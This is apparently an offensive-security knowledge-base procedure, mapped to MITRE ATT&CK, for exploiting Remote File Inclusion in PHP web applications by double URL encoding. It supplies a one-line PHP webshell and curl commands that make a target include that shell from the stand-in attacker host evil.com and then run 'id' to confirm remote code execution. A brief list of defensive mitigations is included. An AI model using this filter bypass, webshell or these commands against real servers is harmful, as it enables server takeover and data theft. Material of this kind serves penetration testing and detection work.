---
id: 586c25e6-b3d1-418f-bdab-d0293a685f17
name: Basic-RFI-with-Double-Encoding
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:58.220940+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques:
  - '[[sub-techniques/JavaScript|T1059.007 - JavaScript]]'
tags:
  - rfi
  - double-encoding
  - file-inclusion
  - web-vulnerability
  - rce
commands:
  - '[[commands/curl-rfi-double-encoded-url]]'
platforms:
  - Web
tools: []
validated: true
---

# Basic-RFI-with-Double-Encoding

## Summary

This procedure exploits a Remote File Inclusion (RFI) vulnerability in a web application by crafting a double-encoded URL that points to a malicious file hosted on an attacker-controlled server. The double encoding bypasses basic input filters, allowing the web server to include and execute the remote file, resulting in remote code execution (RCE) on the target server.

## Description

Remote File Inclusion (RFI) occurs when a web application dynamically includes files based on user-supplied input without proper validation, enabling attackers to include remote files. In this basic variant, the attacker uses double URL encoding (%25 for % and %252f for /) to evade security controls that detect single-encoded malicious paths. The target is typically a PHP application with an insecure 'include' or 'require' statement on parameters like 'page' or 'file'. Upon successful inclusion, the remote file (e.g., a PHP shell) executes on the server, providing command execution capabilities. This technique is common against legacy or misconfigured web apps and can lead to full server compromise, data theft, or lateral movement.

## Requirements

1. Access to a vulnerable web application with RFI in a parameter (e.g., index.php?page=).
2. Control over a remote web server to host the malicious file (e.g., shell.txt containing PHP code like <?php system($_GET['cmd']); ?>).
3. Knowledge of URL encoding and ability to craft payloads.
4. Network access to both the target application and the attacker's server.

## Defense

- Implement strict input validation and sanitization to whitelist allowed file paths and block remote URLs.
- Use a Web Application Firewall (WAF) to detect and block double-encoded or suspicious URL patterns.
- Disable allow_url_include and allow_url_fopen in PHP configuration (php.ini).
- Monitor web server logs for anomalous requests, such as those with multiple % encodings or external domains.

## Objectives

1. Bypass input filters using double URL encoding to include a remote file.
2. Achieve remote code execution by executing the included malicious file on the target server.
3. Gain interactive access to the server for further exploitation or data exfiltration.

## Instructions

### Step 1: Host Malicious File on Attacker Server

**Context**: Prepare a simple PHP webshell on your controlled server to execute commands upon inclusion. This file will be referenced in the RFI payload.

Upload a file named shell.txt (or .php) to your web server with content like:

```php
<?php system($_GET['cmd']); ?>
```

Ensure the file is accessible via HTTP (e.g., http://evil.com/shell.txt). Test accessibility by curling the URL from another machine.

### Step 2: Construct Double-Encoded RFI URL

**Context**: Encode the remote URL twice to bypass filters that decode only once. Single encoding: http://evil.com/shell.txt becomes http%3A//evil.com/shell.txt. Double encoding: %25 replaces %, so slashes become %252f, colons %253A, etc.

The vulnerable parameter (e.g., ?page=) will be set to the double-encoded path.

### Step 3: Send the RFI Request

**Context**: Access the vulnerable endpoint with the crafted URL using a tool like curl or a browser. This triggers the inclusion and execution of the remote file.

**Command** ([[commands/curl-rfi-double-encoded-url]]):

```bash
curl "http://example.com/index.php?page=http%253A%252f%252fevil.com%252fshell.txt"
```

> This command sends a GET request to the target, passing the double-encoded remote path in the 'page' parameter. The server decodes it once (or twice depending on config), includes the file, and executes it. If successful, the response may show output from the shell or a command execution result.

### Step 4: Verify Execution and Interact

**Context**: Confirm RCE by appending a command parameter to the shell URL (e.g., ?cmd=id) and re-requesting. Look for command output in the response.

Modify the curl command to include a test command:

```bash
curl "http://example.com/index.php?page=http%253A%252f%252fevil.com%252fshell.txt&cmd=id"
```

> Expected success: Response contains output like 'uid=33(www-data) gid=33(www-data)'. If no output, check encoding, server config, or logs for errors.
